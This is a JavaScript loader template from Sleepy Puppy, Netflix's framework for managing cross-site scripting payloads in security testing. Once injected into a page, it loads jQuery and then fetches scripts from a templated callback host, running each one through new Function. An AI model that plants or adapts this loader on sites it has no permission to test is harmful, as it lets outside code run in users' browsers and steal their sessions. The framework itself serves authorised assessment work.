/*     Copyright 2015 Netflix, Inc.

     Licensed under the Apache License, Version 2.0 (the "License");
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at

         http://www.apache.org/licenses/LICENSE-2.0

     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
     See the License for the specific language governing permissions and
     limitations under the License.
*/
console.log("Sleepy Puppy is a Cross-site Scripting Payload Management Framework")
console.log("Sleepy Puppy JavaScripts will execute in the order they were configured, but may finish execution at different times depending on if the JavaScripts are asyncronous.")
console.log("More information on Sleepy Puppy can be found here: https://github.com/Netflix/sleepy-puppy")
// Always load jQuery regardless of Javascripts
if (typeof jQuery === 'undefined') {

    function getScript(url, success) {
        var script = document.createElement('script');
        script.src = url;

        var head = document.getElementsByTagName('head')[0],
        done = false;

        script.onload = script.onreadystatechange = function () {

            if (!done && (!this.readyState || this.readyState === 'loaded' || this.readyState === 'complete')) {
                done = true;
                success();
                script.onload = script.onreadystatechange = null;
                head.removeChild(script);
            }
        };

        head.appendChild(script);
    }

    getScript('{{callback_protocol}}://{{hostname}}/static/jquery-1.11.3.min.js', function () {
        loader();
    });

} else {
    $(document).ready(loader);
}

function loader () {
    $.ajax({
    type: 'GET',
    url: "{{callback_protocol}}://{{hostname}}/api/puppyscript_loader/{{payload}}?a={{assessment}}",
    dataType: 'json',
    success: function (data) {
        $.each(data, function(index, element) {
            new Function(element.code)();
            // debug
            // console.log("Sleepy Puppy is executing Javascript " + index)
        });
    }
});
}
